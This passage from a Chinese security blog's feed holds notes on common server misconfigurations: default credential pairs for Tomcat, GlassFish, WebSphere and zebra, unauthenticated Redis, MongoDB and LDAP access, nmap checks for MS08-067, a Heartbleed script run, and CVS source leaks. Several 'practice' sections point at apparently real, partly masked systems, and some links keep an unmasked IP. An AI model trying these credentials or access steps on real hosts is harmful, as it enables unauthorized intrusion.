rel="noopener">http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS</a><br>#5规则，简单地说，便是根据最后一个数据块(<a href="http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。" target="_blank" rel="noopener">http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。</a></p><h2 id="26-2-漏洞利用"><a href="#26-2-漏洞利用" class="headerlink" title="26.2 漏洞利用 "></a>26.2 漏洞利用 </h2><p>略过，乌云上有案例。</p><h1 id="27-tomcat弱口令"><a href="#27-tomcat弱口令" class="headerlink" title="27 tomcat弱口令 "></a>27 tomcat弱口令 </h1><h2 id="27-1-基础知识"><a href="#27-1-基础知识" class="headerlink" title="27.1 基础知识 "></a>27.1 基础知识 </h2><p>不再提及。</p><h2 id="27-2-漏洞利用"><a href="#27-2-漏洞利用" class="headerlink" title="27.2 漏洞利用 "></a>27.2 漏洞利用 </h2><p>弱密码：</p><p><a href="http://www.xxxx.com:8080/manager/html" target="_blank" rel="noopener">http://www.xxxx.com:8080/manager/html</a> tomcat:tomcat</p><p><a href="http://www.xxxx.com:8080/manager/html" target="_blank" rel="noopener">http://www.xxxx.com:8080/manager/html</a> admin:admin</p><h1 id="28-phpmyadmin弱口令"><a href="#28-phpmyadmin弱口令" class="headerlink" title="28 phpmyadmin弱口令 "></a>28 phpmyadmin弱口令 </h1><p>略</p><h1 id="29-MongoDB配置不当"><a href="#29-MongoDB配置不当" class="headerlink" title="29 MongoDB配置不当 "></a>29 MongoDB配置不当 </h1><p>drops.wooyun.org/papers/850</p><h2 id="29-1-基本介绍"><a href="#29-1-基本介绍" class="headerlink" title="29.1 基本介绍 "></a>29.1 基本介绍 </h2><p>略</p><h2 id="29-2-未授权访问"><a href="#29-2-未授权访问" class="headerlink" title="29.2 未授权访问 "></a>29.2 未授权访问 </h2><p>默认数据库 admin</p><p>用户密码和密码均为空</p><p><img src="\assets\img\安全运维\file_html_af31540eed427f60.png" alt=""></p><h2 id="29-3-实战演练"><a href="#29-3-实战演练" class="headerlink" title="29.3 实战演练 "></a>29.3 实战演练 </h2><p>yy.yy.yy.yy:27017<br>博苑家_幼儿园教育信息化平台</p><p><img src="\assets\img\安全运维\file_html_933d6e56d127adb.png" alt=""></p><h1 id="30-各种敏感后台对外开放"><a href="#30-各种敏感后台对外开放" class="headerlink" title="30 各种敏感后台对外开放 "></a>30 各种敏感后台对外开放 </h1><p>一般“奇葩”端口web访问可见。</p><h1 id="31-Django配置不当致信息泄露"><a href="#31-Django配置不当致信息泄露" class="headerlink" title="31 Django配置不当致信息泄露 "></a>31 Django配置不当致信息泄露 </h1><p>Django设置debug = True<br>，将报错信息返回至浏览页面，从而导致信息泄露</p><h1 id="32-Redis未授权访问"><a href="#32-Redis未授权访问" class="headerlink" title="32 Redis未授权访问 "></a>32 Redis未授权访问 </h1><p>Port: 6379</p><p>一般不需要认证，可直接访问</p><h2 id="32-1-基础知识"><a href="#32-1-基础知识" class="headerlink" title="32.1 基础知识 "></a>32.1 基础知识 </h2><p>Redis是一个NoSQL的数据库，数据通过键/值对存储在内存中。默认配置中，默认开放没有认证的TCP/6379端口。</p><p>和memcached类似，支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)。与memcached不同之处在于，可以随时执行“save”命令将当前redis的数据保存到硬盘，此外redis也会根据配置自动存储数据到硬盘上。</p><p>其中RDB就像数据库备份文件</p><p>AOF则是一个log日志文件</p><h2 id="32-2-利用方式"><a href="#32-2-利用方式" class="headerlink" title="32.2 利用方式 "></a>32.2 利用方式 </h2><ul><li>Kali下：</li></ul><p>redis-cli -h xx.com</p><ul><li><p>使用软件： Redis Desktop Manager</p></li><li><p>利用redis未授权访问漏洞getshell【<a href="http://www.secpulse.com/archives/5357.html】" target="_blank" rel="noopener">www.secpulse.com/archives/5357.html】</a></p><ul><li><p>开启web服务</p></li><li><p>网站物理路径</p></li><li><p>www目录可写（root权限）</p></li></ul></li></ul><h2 id="32-3-实战演练"><a href="#32-3-实战演练" class="headerlink" title="32.3 实战演练 "></a>32.3 实战演练 </h2><p>xx科技有限公司</p><p><img src="\assets\img\安全运维\file_html_83a0c3790ea4b0cf.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_f0a10558018436fa.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_29c9a47e91a7ef0a.png" alt=""></p><h1 id="33-LDAP未授权访问"><a href="#33-LDAP未授权访问" class="headerlink" title="33 LDAP未授权访问 "></a>33 LDAP未授权访问 </h1><p>Port: 389<br>WooYun-2015-92789(<a href="http://www.wooyun.org/bugs/wooyun-2015-092789" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2015-092789</a>)</p><h2 id="33-1-基础知识"><a href="#33-1-基础知识" class="headerlink" title="33.1 基础知识 "></a>33.1 基础知识 </h2><p>Lightweight Directory Access<br>Protocol，轻量目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p><h2 id="33-2-利用方式"><a href="#33-2-利用方式" class="headerlink" title="33.2 利用方式 "></a>33.2 利用方式 </h2><p>使用LDAP Admin进行登陆</p><h2 id="33-3-应用实例"><a href="#33-3-应用实例" class="headerlink" title="33.3 应用实例 "></a>33.3 应用实例 </h2><p>zz.zz.zz.zz</p><p><img src="\assets\img\安全运维\file_html_63de4b8b96d21dcd.png" alt=""></p><h1 id="34-SMB弱口令"><a href="#34-SMB弱口令" class="headerlink" title="34 SMB弱口令 "></a>34 SMB弱口令 </h1><p>Port: 445</p><h2 id="34-1-smb字典"><a href="#34-1-smb字典" class="headerlink" title="34.1 smb字典 "></a>34.1 smb字典 </h2><h2 id="34-2-MS08-067溢出"><a href="#34-2-MS08-067溢出" class="headerlink" title="34.2 MS08-067溢出 "></a>34.2 MS08-067溢出 </h2><p><a href="http://www.2cto.com/Article/201308/237265.html" target="_blank" rel="noopener">http://www.2cto.com/Article/201308/237265.html</a></p><p>Windows Server<br>服务RPC请求缓冲区溢出漏洞，如果用户在受影响的系统上收到特制的RPC请求，则该漏洞可能允许远程执行代码。在Microsoft<br>Windows 2000 、Windows XP 、Windows<br>Server2003系统上，攻击者可能未经身份即可利用此漏洞运行代码，此漏洞可以形成蠕虫攻击。</p><p>Nmap 可以检测目标上是否存在该漏洞：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namp –sS –A –script=smb-check-vulns –PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span><span class="selector-class">.zz</span></span><br><span class="line"></span><br><span class="line">nmap -sS -A --script=smb-check-vulns -PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span><span class="selector-class">.zz</span></span><br></pre></td></tr></table></figure></p><p>…….</p><h1 id="35-openssl心脏出血"><a href="#35-openssl心脏出血" class="headerlink" title="35 openssl心脏出血 "></a>35 openssl心脏出血 </h1><p>Port：443</p><p>Kali桌面以保存python验证脚本</p><p>root@Aerfa:~/Desktop# python openssl.py zz.zz.zz.zz</p><h1 id="36-squid代理默认端口"><a href="#36-squid代理默认端口" class="headerlink" title="36 squid代理默认端口 "></a>36 squid代理默认端口 </h1><p>Port: 3128</p><p>若没有设置口令，则很可能直接漫游内网。</p><h1 id="37-GlassFish-web中间件弱口令"><a href="#37-GlassFish-web中间件弱口令" class="headerlink" title="37 GlassFish web中间件弱口令 "></a>37 GlassFish web中间件弱口令 </h1><p>Port: 4848</p><p>弱口令：admin / adminadmin</p><h1 id="38-PHP-FastCGI远程利用"><a href="#38-PHP-FastCGI远程利用" class="headerlink" title="38 PHP FastCGI远程利用 "></a>38 PHP FastCGI远程利用 </h1><p>Port：9000</p><p>zone.wooyun.org/content/1060</p><p>使用nmap进行指纹识别： <code>nmap –sV –p 9000–open zz.zz.zz.zz/24</code></p><p>目前遇到poc执行出现问题：invalid header<br>version</p><p>（windows 7下未安装goland，<br>kali中已安装仍然出现该问题）</p><h1 id="39-elasticsearch代码执行"><a href="#39-elasticsearch代码执行" class="headerlink" title="39 elasticsearch代码执行 "></a>39 elasticsearch代码执行 </h1><p>Port: 9200</p><h1 id="40-websphere-web中间件弱口令"><a href="#40-websphere-web中间件弱口令" class="headerlink" title="40 websphere web中间件弱口令 "></a>40 websphere web中间件弱口令 </h1><p>Port: 9043</p><p>弱口令：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin / admin</span><br><span class="line"></span><br><span class="line">websphere / websphere</span><br><span class="line"></span><br><span class="line">system / manager</span><br></pre></td></tr></table></figure></p><h1 id="41-zebra路由弱密码"><a href="#41-zebra路由弱密码" class="headerlink" title="41 zebra路由弱密码 "></a>41 zebra路由弱密码 </h1><p>Port: 2601,2604</p><p>zebra / zebra</p><h1 id="42-rundeck-web"><a href="#42-rundeck-web" class="headerlink" title="42 rundeck web "></a>42 rundeck web </h1><p>Port：4440 wooyun-2015-092026</p><p>runDeck是用Java/Grails写的开源工具，帮助用户在数据中心或者云环境中自动化各种操作和流程。通过命令行或web界面，用户可以对任意数量的服务器进行操作，大大降低了对服务器自动化的门槛。</p><p><a href="http://IP:4440" target="_blank" rel="noopener">http://IP:4440</a> admin / admin</p><p><a href="http://IP:4440/menu/home" target="_blank" rel="noopener">http://IP:4440/menu/home</a></p><h1 id="43-dns未设置spf导致邮箱欺骗漏洞"><a href="#43-dns未设置spf导致邮箱欺骗漏洞" class="headerlink" title="43 dns未设置spf导致邮箱欺骗漏洞 "></a>43 dns未设置spf导致邮箱欺骗漏洞 </h1><p>nslookup –qt=mx baidu.com</p><p>nslookup –qt=txt baidu.com</p><h1 id="44-CVS源码泄露"><a href="#44-CVS源码泄露" class="headerlink" title="44 CVS源码泄露 "></a>44 CVS源码泄露 </h1><h2 id="44-1-基础知识"><a href="#44-1-基础知识" class="headerlink" title="44.1 基础知识 "></a>44.1 基础知识 </h2><p>略</p><h2 id="44-2-实例应用"><a href="#44-2-实例应用" class="headerlink" title="44.2 实例应用 "></a>44.2 实例应用 </h2><p>zz集团</p><p><a href="http://61.152.242.65/bs3q/CVS/Root" target="_blank" rel="noopener">http://yy.yy.yy.yy/bs3q/CVS/Root</a></p><p><a href="http://61.152.242.65/cmbs/CVS/Root" target="_blank" rel="noopener">http://yy.yy.yy.yy/cmbs/CVS/Root</a></p><p><img src="\assets\img\安全运维\file_html_9f3274155b1132f6.png" alt=""></p><p><a href="http://61.152.242.65/cmbs/CVS/Entries" target="_blank" rel="noopener">http://yy.yy.yy.yy/cmbs/CVS/Entries</a></p><p><img src="\assets\img\安全运维\file_html_41469a6a25a8a31a.png" alt=""></p><h1 id="45-Tomcat-examples-directory漏洞"><a href="#45-Tomcat-examples-directory漏洞" class="headerlink" title="45 Tomcat examples directory漏洞 "></a>45 Tomcat examples directory漏洞 </h1><p><a href="http://61.152.242.65/examples/servlets/servlet/SessionExample" target="_blank" rel="noopener">http://yy.yy.yy.yy/examples/servlets/servlet/SessionExample</a></p><p><img src="\assets\img\安全运维\file_html_3a3e383932a1596a.png" alt=""></p><p>是否存在sql post注入<br>、session伪造等安全问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0-Readme&quot;&gt;&lt;a href=&quot;#0-Readme&quot; class=&quot;headerlink&quot; title=&quot;0 Readme &quot;&gt;&lt;/a&gt;0 Readme &lt;/h1&gt;&lt;p&gt;来源于网络，回馈于网络。&lt;/p&gt;
&lt;p&gt;以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。&lt;/p&gt;
&lt;p&gt;这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。&lt;/p&gt;
&lt;p&gt;仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞利用" scheme="http://www.pa55w0rd.club/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="安全运维" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Web应用安全测试备忘录 By legend</title>
    <link href="http://www.pa55w0rd.club/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://www.pa55w0rd.club/web应用安全测试备忘录/</id>
    <published>2018-10-29T03:38:20.000Z</published>
    <updated>2018-11-21T08:54:34.539Z</updated>
    
    <content type="html"><![CDATA[<p><img src="\assets\img\xss\8.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;\assets\img\xss\8.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="备忘录" scheme="http://www.pa55w0rd.club/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
</feed>
